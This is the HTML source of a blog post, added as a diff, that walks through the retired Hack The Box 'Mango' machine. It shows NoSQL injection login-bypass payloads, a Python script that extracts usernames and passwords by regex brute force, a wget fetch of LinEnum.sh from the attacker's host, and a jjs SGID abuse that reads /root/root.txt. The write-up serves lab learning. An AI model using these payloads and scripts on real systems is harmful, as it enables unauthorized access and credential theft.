@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>HTB-Mango | InfoSecBlog</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="HTB-Mango" />
+<meta name="author" content="GitHub User" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hack the Box - Mango Machine." />
+<meta property="og:description" content="Hack the Box - Mango Machine." />
+<link rel="canonical" href="http://localhost:4000/htb/2020/09/05/HTB-Mango.html" />
+<meta property="og:url" content="http://localhost:4000/htb/2020/09/05/HTB-Mango.html" />
+<meta property="og:site_name" content="InfoSecBlog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-09-05T00:00:00+03:00" />
+<script type="application/ld+json">
+{"description":"Hack the Box - Mango Machine.","@type":"BlogPosting","headline":"HTB-Mango","dateModified":"2020-09-05T00:00:00+03:00","datePublished":"2020-09-05T00:00:00+03:00","url":"http://localhost:4000/htb/2020/09/05/HTB-Mango.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/2020/09/05/HTB-Mango.html"},"author":{"@type":"Person","name":"GitHub User"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="InfoSecBlog" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">InfoSecBlog<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-red-hover" href="https://abdullahalshubaili.github.io"><i class="fab fa-itch-io"></i></a><a class="color-purple-hover" href="https://github.com/abdullahalshubaili"><i class="fab fa-github-square"></i></a><a class="color-cyan-hover" href="https://www.linkedin.com/in/abdullah-alshubaili-007943108/"><i class="fab fa-linkedin"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <!-- 
+  <div class="author-box">
+    
+    
+        <img src="assets/favicon.png" class="author-avatar" alt="Avatar" />
+        Generally in this blog I will be talking about my tech field,
+        specially cyber security.</br><br> <p>Through documentation, information lives for ever. </p>
+    
+
+</div>
+
+ -->
+<div class="post">
+  <h1 class="post-title">HTB-Mango</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/HTB/">HTB</a>
+      
+      <a class="tag" href="/tag/Mango/">Mango</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 05 Sep 2020</div>
+  
+  <div class="post-description">Hack the Box - Mango Machine.</div>
+  
+  <h1 id="brief-summary">Brief Summary</h1>
+<p>Hello, this is my first writeup and it’s going to be about HackTheBox: Mango machine. The box is retired now which means we can talk about it publicly. I personally enjoyed playing mango machine, I learned new stuff and had fun.</p>
+
+<p><img src="/assets/mango/machine.png" alt="machine" /></p>
+
+<h1 id="nmap">Nmap</h1>
+<p>Starting off, with <strong>nmap</strong> to get an idea about the machine and the services running. <code class="language-plaintext highlighter-rouge">nmap 10.10.10.162 -A</code> will provide us with os detection, versions of serviecs running if applicable and traceroute of the target.</p>
+
+<pre><code class="language-nmap">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-27 20:40 +03
+Nmap scan report for 10.10.10.162
+Host is up (0.096s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh  OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|    2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
+|    256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
+|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
+80/tcp   open  http     Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 403 Forbidden
+443/tcp open   ssl/http Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Mango | Search Base
+| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
+| Not valid before: 2019-09-27T14:21:19
+|_Not valid after:  2020-09-26T14:21:19
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_   http/1.1
+
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 29.15 seconds
+</code></pre>
+
+<p>from the output of nmap, we can note that there is a web application running on port 80/443 and has a certificate with a domain name registered as <strong>staging-order.mango.htb</strong></p>
+
+<h1 id="enumeration">Enumeration</h1>
+<p>when i visited port <strong>80</strong> i got Forbidden response from server. So i visited port <strong>443</strong> instead. but the page didnt load completely, the broweser notified me for connection not secured, which is weird. So i looked to into the certificate and found this domain <strong>staging-order.mango.htb</strong> mango that got caught previously with nmap. i accepted the risk and continued. The page loaded completely:</p>
+
+<p><img src="/assets/mango/1.png" alt="1" /></p>
+
+<p>the search engine doesn’t work yet. and ‘Analytics’ was a rabit hole believe me. i spent hours and got put with nothing. lets start burp suite, and intrecpt the traffic. First thing i will do, is to add the hostname resolution rule in burp -&gt; project options -&gt; connections.</p>
+
+<p><img src="/assets/mango/2.png" alt="2" /></p>
+
+<p>this time i visited the new domain, and found a login page. intresting…</p>
+
+<p><img src="/assets/mango/3.png" alt="3" /></p>
+
+<p>lots of mangos appearently. the machine name and these pictures. Lets fuzz the login page little bit with different sql injection techniques. We should also include NoSql. Since you know, MongoDB is one of popular Databases and the box name is some how rhyme with it.</p>
+
+<h1 id="nosql-injection--more-enumeratation">NoSql Injection &amp; More Enumeratation</h1>
+<p>lets capture the login request with <strong>Burp Suite</strong>, and send it to repteater.</p>
+
+<p><img src="/assets/mango/4.png" alt="4" /></p>
+
+<p>After trying many things, and looking online for useful articles about slqi on MongoDB. 
+<a href="https://nullsweep.com/a-nosql-injection-primer-with-mongo">Found this article</a>.</p>
+
+<p>And The way to inject the parameters will be like</p>
+
+<p>original POST data:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">username=admin&amp;password=&amp;login=login</span><span class="w">
+</span></code></pre></div></div>
+
+<p>injected with NoSql attack:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">username</span><span class="p">[</span><span class="err">$ne</span><span class="p">]</span><span class="err">=admin&amp;password</span><span class="p">[</span><span class="err">$ne</span><span class="p">]</span><span class="err">=&amp;login=login</span><span class="w">
+</span></code></pre></div></div>
+
+<p>By using <code class="language-plaintext highlighter-rouge">[$ne]</code> we specify that stored data in the DB should not be equal to our input.
+here we have a redirection.</p>
+
+<p><img src="/assets/mango/5.png" alt="5" /></p>
+
+<p>following that a successful login.</p>
+
+<p><img src="/assets/mango/6.png" alt="6" /></p>
+
+<p>but it looks like the page is not completed yet and it has username/email admin@mango.htb . Anyway lets enumerate more usernames.
+By using <code class="language-plaintext highlighter-rouge">[$regex]</code> we tell the server to use ‘Regular Expressing’ for our input and search for it in the database.
+Enumerating the login page with <code class="language-plaintext highlighter-rouge">username[$regex]=^a&amp;password[$ne]=&amp;login=login</code> as POST data that gets send to the server with payload of  <strong><code class="language-plaintext highlighter-rouge"> ^</code></strong> to specify the search for the first letter only, and a because it is the begining of ‘admin’ account.</p>
+
+<p>and it looks like we have a successful login too.</p>
+
+<p><img src="/assets/mango/7.png" alt="7" /></p>
+
+<p>lets try ‘<strong>d</strong>’ .</p>
+
+<p>the response status code was not 302 (redirection). Meaning that there is no account name that starts with ‘d’ in our case. We can enumrate letter by letter or we can automate this with python.</p>
+
+<p>Here a python script that will enumerate usernames.</p>
+
+<p>Note: i routed the script traffic to Burp Suite through <strong>localhost</strong> port <strong>8080</strong> for debugging purposes. If you are not using burp please remove the lines from 6-14</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="mi">1</span>  <span class="c1"># python3 nosql-enum.py
+</span>  <span class="mi">2</span>  <span class="kn">import</span> <span class="nn">requests</span>
+  <span class="mi">3</span>  <span class="kn">import</span> <span class="nn">re</span>
+  <span class="mi">4</span>  <span class="kn">import</span> <span class="nn">os</span>
+  <span class="mi">5</span>  
+  <span class="mi">6</span>  <span class="c1">#=================================================
+</span>  <span class="mi">7</span>  <span class="c1"># to send this script traffic through Burp Suite
+</span>  <span class="mi">8</span>  <span class="n">proxy</span> <span class="o">=</span> <span class="s">'http://localhost:8080'</span>
+  <span class="mi">9</span>  
+ <span class="mi">10</span>  <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">[</span><span class="s">'http_proxy'</span><span class="p">]</span> <span class="o">=</span> <span class="n">proxy</span>
+ <span class="mi">11</span>  <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">[</span><span class="s">'HTTP_PROXY'</span><span class="p">]</span> <span class="o">=</span> <span class="n">proxy</span>
+ <span class="mi">12</span>  <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">[</span><span class="s">'https_proxy'</span><span class="p">]</span> <span class="o">=</span> <span class="n">proxy</span>
+ <span class="mi">13</span>  <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">[</span><span class="s">'HTTPS_PROXY'</span><span class="p">]</span> <span class="o">=</span> <span class="n">proxy</span>
+ <span class="mi">14</span>  <span class="c1"># =================================================
+</span> <span class="mi">15</span>  
+ <span class="mi">16</span>  <span class="n">url</span> <span class="o">=</span> <span class="s">'http://staging-order.mango.htb'</span>
+ <span class="mi">17</span>  <span class="n">cookies</span> <span class="o">=</span> <span class="s">'PHPSESSID='</span>
+ <span class="mi">18</span>  
+ <span class="mi">19</span>  <span class="n">chars</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="mi">33</span><span class="p">,</span> <span class="mi">127</span><span class="p">)</span>
+ <span class="mi">20</span>  
+ <span class="mi">21</span>  <span class="n">p1</span> <span class="o">=</span> <span class="s">''</span>
+ <span class="mi">22</span>  
+ <span class="mi">23</span>  
+ <span class="mi">24</span>  <span class="k">def</span> <span class="nf">rqst</span><span class="p">(</span><span class="n">p1</span><span class="p">):</span>
+ <span class="mi">25</span>      <span class="n">data1</span> <span class="o">=</span> <span class="s">"username[$regex]=^"</span><span class="o">+</span><span class="n">p1</span><span class="o">+</span><span class="s">"&amp;password[$ne]=&amp;login=login"</span>
+ <span class="mi">26</span>      <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data1</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span>
+ <span class="mi">27</span>            <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/x-www-form-urlencoded'</span><span class="p">})</span>
+ <span class="mi">28</span>  
+ <span class="mi">29</span>      <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span><span class="p">:</span>
+ <span class="mi">30</span>      <span class="n">P1</span> <span class="o">=</span> <span class="n">p1</span>
+ <span class="mi">31</span>      <span class="k">print</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">found so far: '</span> <span class="o">+</span> <span class="n">p1</span><span class="p">)</span>
+ <span class="mi">32</span>  
+ <span class="mi">33</span>      <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
+ <span class="mi">34</span>          <span class="k">if</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="ow">in</span> <span class="p">[</span><span class="s">'.'</span><span class="p">,</span><span class="s">'?'</span><span class="p">,</span><span class="s">'*'</span><span class="p">,</span><span class="s">'^'</span><span class="p">,</span><span class="s">'+'</span><span class="p">,</span><span class="s">'&amp;'</span><span class="p">,</span><span class="s">'|'</span><span class="p">]:</span> 
+ <span class="mi">35</span>          <span class="n">p1</span> <span class="o">=</span> <span class="n">P1</span> <span class="o">+</span><span class="s">'</span><span class="se">\\</span><span class="s">'</span><span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="c1"># to escape chars
+</span> <span class="mi">36</span>          <span class="n">rqst</span><span class="p">(</span><span class="n">p1</span><span class="p">)</span>
+ <span class="mi">37</span>          <span class="k">else</span><span class="p">:</span>
+ <span class="mi">38</span>          <span class="n">p1</span> <span class="o">=</span> <span class="n">P1</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+ <span class="mi">39</span>          <span class="k">print</span><span class="p">(</span><span class="s">'</span><span class="se">\r</span><span class="s">'</span><span class="o">+</span><span class="n">p1</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
+ <span class="mi">40</span>          <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">p1</span><span class="p">)</span> <span class="o">&gt;=</span><span class="mi">4</span><span class="p">:</span>
+ <span class="mi">41</span>              <span class="n">x</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">".*\$\$$"</span><span class="p">,</span> <span class="n">p1</span><span class="p">)</span> <span class="c1"># exit condition if $ (end of line) was found will exit and print the string without $
+</span> <span class="mi">42</span>              <span class="k">if</span> <span class="n">x</span><span class="p">:</span>
+ <span class="mi">43</span>               <span class="k">print</span><span class="p">(</span><span class="s">'</span><span class="se">\n\n</span><span class="s">this is the string: '</span> <span class="o">+</span> <span class="n">p1</span><span class="p">[:</span><span class="o">-</span><span class="mi">2</span><span class="p">])</span>
+ <span class="mi">44</span>               <span class="nb">exit</span><span class="p">()</span>
+ <span class="mi">45</span>  
+ <span class="mi">46</span>          <span class="n">rqst</span><span class="p">(</span><span class="n">p1</span><span class="p">)</span>
+ <span class="mi">47</span>      <span class="k">return</span>
+ <span class="mi">48</span>  
+ <span class="mi">49</span>  
+ <span class="mi">50</span> <span class="k">print</span><span class="p">(</span><span class="n">rqst</span><span class="p">(</span><span class="n">p1</span><span class="p">))</span>
+</code></pre></div></div>
+<p>running with script python3 we get the following account name <strong>admin</strong> as expected</p>
+
+<p><img src="/assets/mango/8.png" alt="8" /></p>
+
+<p>Now lets tweak the script little bit to be able to find another username. First thing we should add , ‘<strong>a</strong>’ in line 34 just like this</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="ow">in</span> <span class="p">[</span><span class="s">'.'</span><span class="p">,</span><span class="s">'?'</span><span class="p">,</span><span class="s">'*'</span><span class="p">,</span><span class="s">'^'</span><span class="p">,</span><span class="s">'+'</span><span class="p">,</span><span class="s">'&amp;'</span><span class="p">,</span><span class="s">'|'</span><span class="p">,</span><span class="s">'a'</span><span class="p">]:</span>
+</code></pre></div></div>
+<p>this way will skip letter ‘a’ so we can enumerate the first letter of the another target account. Note: if you suspect that there is another account that start with ‘a’ but not admin. you can escape letter ‘d’ instead of ‘a’ for enumeratation.</p>
+
+<p>running the script after tweaking it we get.</p>
+
+<p><img src="/assets/mango/9.png" alt="9" /></p>
+
+<p>we see that ‘<strong>m</strong>’ is the first letter. Now lets tweak the script another time. Will remove ‘<strong>a</strong>’ from
+line # 34</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="ow">in</span> <span class="p">[</span><span class="s">'.'</span><span class="p">,</span><span class="s">'?'</span><span class="p">,</span><span class="s">'*'</span><span class="p">,</span><span class="s">'^'</span><span class="p">,</span><span class="s">'+'</span><span class="p">,</span><span class="s">'&amp;'</span><span class="p">,</span><span class="s">'|'</span><span class="p">,</span><span class="s">'a'</span><span class="p">]:</span>
+</code></pre></div></div>
+
+<p>and modify <code class="language-plaintext highlighter-rouge">data1</code> variable and add <strong>‘m’</strong> as a value for <code class="language-plaintext highlighter-rouge">username=</code> parameters.</p>
+
+<p>line # 25 should look like this</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">data1</span> <span class="o">=</span> <span class="s">"username[$regex]=^m"</span><span class="o">+</span><span class="n">p1</span><span class="o">+</span><span class="s">"&amp;password[$ne]=&amp;login=login"</span>
+</code></pre></div></div>
+<p>and the result is:</p>
+
+<p><img src="/assets/mango/10.png" alt="10" /></p>
+
+<p>so know we have two account names <strong>admin</strong> and <strong>mango</strong>. Now with extraction of passwords. Will tweak the script to fit our needs in this case.
+in line#25 we will modify <code class="language-plaintext highlighter-rouge">data1</code> variable to the following:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">data1</span> <span class="o">=</span> <span class="s">"username=admin&amp;password[$regex]=^"</span><span class="o">+</span><span class="n">p1</span><span class="o">+</span><span class="s">"&amp;login=login"</span> 
+</code></pre></div></div>
+<p>by this modification we are injecting password parameter instead of username and we hardcoded the username to search for the associated password.</p>
+
+<p><img src="/assets/mango/11.png" alt="11" /></p>
+
+<p>checking out the result. And a successful login.</p>
+
+<p><img src="/assets/mango/12.png" alt="12" /></p>
+
+<p>running the script with <strong>mango</strong> hardcoded as username.</p>
+
+<p><img src="/assets/mango/13.png" alt="13" /></p>
+
+<h1 id="initial-foothold--user-own">Initial Foothold &amp; User Own</h1>
+<p>lets try these creds to ssh in the box.
+ssh <code class="language-plaintext highlighter-rouge">mango@10.10.10.162</code> and enter the password when prompt.</p>
+
+<p><span style="color:grey">Admin account didnt have ssh login.</span></p>
+
+<p>once we are in the box as mango, will look around for juicy stuff.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mango@mango:~<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+mango:x:1000:1000:mango:/home/mango:/bin/bash
+admin:x:4000000000:1001:,,,:/home/admin/:/bin/sh
+mongodb:x:111:65534::/home/mongodb:/usr/sbin/nologin
+</code></pre></div></div>
+<p>Since there is <strong>*admin</strong> username in the box. lets try <code class="language-plaintext highlighter-rouge">su - admin</code> and the creds found earlier.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mango@mango:~<span class="nv">$ </span>su - admin
+      
+Password: 
+      
+<span class="nv">$ </span><span class="nb">whoami
+      
+</span>admin
+      
+<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>Nice we got in with admin and it looks like admin have <strong>user.txt</strong> in home directory.
+Now we should run linux enumeration script such as <a href="https://github.com/rebootuser/LinEnum"><strong>LinEnum.sh</strong></a>, but we have to download it in our machine first, then move the script to mango box with following commands.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<p>in mango box we can use <strong>wget</strong> also to download it from our machine</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget http://10.10.YOUR.IP/LinEnum.sh
+<span class="nv">$ </span><span class="nb">chmod</span> +x LinEnum.sh
+</code></pre></div></div>
+<p>and run the script <code class="language-plaintext highlighter-rouge">./LinEnum.sh</code></p>
+
+<h1 id="privilege-escalation--root-own">Privilege Escalation &amp; Root Own</h1>
+<p>Looking at the output from <strong>LinEnum.sh</strong> we see that there is <strong>SGID</strong> (Set Group ID) binary named ‘<strong>jjs</strong>’ looks vulnerable.
+Let me introduce you to a great webpage <a href="https://gtfobins.github.io/">GTFObin</a> that makes binary exploitation much easier. Search for jjs and you can see many methods of how to abuse SGID on <strong>jjs</strong>.
+Here is one way of doing that, will just read the root.txt from root home directory.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'var BufferedReader = Java.type("java.io.BufferedReader");
+var FileReader = Java.type("java.io.FileReader");
+var br = new BufferedReader(new FileReader("/root/root.txt"));
+while ((line = br.readLine()) != null) { print(line); }'</span> | jjs
+</code></pre></div></div>
+
+<p>lets run the above commands, and we should get <strong>root.txt</strong> printed out for us.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'var BufferedReader = Java.type("java.io.BufferedReader");
+      
+var FileReader = Java.type("java.io.FileReader");
+      
+var br = new BufferedReader(new FileReader("/root/root.txt"));
+
+while ((line = br.readLine()) != null) { print(line); }'</span> | jjs&gt; <span class="o">&gt;</span> <span class="o">&gt;</span> 
+      
+Warning: The jjs tool is planned to be removed from a future JDK release
+
+jjs&gt; var BufferedReader <span class="o">=</span> Java.type<span class="o">(</span><span class="s2">"java.io.BufferedReader"</span><span class="o">)</span><span class="p">;</span>
+
+jjs&gt; var FileReader <span class="o">=</span> Java.type<span class="o">(</span><span class="s2">"java.io.FileReader"</span><span class="o">)</span><span class="p">;</span>
+      
+jjs&gt; var br <span class="o">=</span> new BufferedReader<span class="o">(</span>new FileReader<span class="o">(</span><span class="s2">"/root/root.txt"</span><span class="o">))</span><span class="p">;</span>
+
+jjs&gt; <span class="k">while</span> <span class="o">((</span>line <span class="o">=</span> br.readLine<span class="o">())</span> <span class="o">!=</span> null<span class="o">)</span> <span class="o">{</span> print<span class="o">(</span>line<span class="o">)</span><span class="p">;</span> <span class="o">}</span>
+
+<span class="k">****************</span>81688424e9ab15ab15
+</code></pre></div></div>
+
+<ul>
+  <li>Thanks for reading.</li>
+</ul>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'http://localhost:4000/htb/2020/09/05/HTB-Mango.html';
+     this.page.identifier = '/htb/2020/09/05/HTB-Mango';
+     this.page.title = 'HTB-Mango';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//Abdullah Alshubaili.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/htb/2020/09/05/HTB-Magic.html">
+            HTB-Magic
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/htb/" class="set-5">HTB</a> <a href="/tag/magic/" class="set-1">Magic</a> <a href="/tag/mango/" class="set-1">Mango</a></div>
+  
+
+
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"> Thanks to <a href="https://github.com/bitbrain/jekyll-dash">bitbrain</a> for this theme.<div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
